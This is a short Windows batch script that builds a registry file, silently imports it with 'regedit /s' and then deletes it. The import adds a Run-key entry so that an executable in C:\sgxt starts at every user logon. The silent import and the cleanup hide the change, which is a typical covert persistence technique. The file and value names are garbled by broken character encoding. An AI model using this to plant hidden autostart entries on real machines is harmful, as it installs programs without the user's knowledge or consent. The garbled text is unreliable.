@echo off 
echo REGEDIT4>・36_pcms.reg 
echo. 
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run]>>・36_pcms.reg 
echo "蝕字紗畜"="C:\\sgxt\\・36_pcms.exe">>・36_pcms.reg 
regedit /s ・36_pcms.reg &del ・36_pcms.reg 

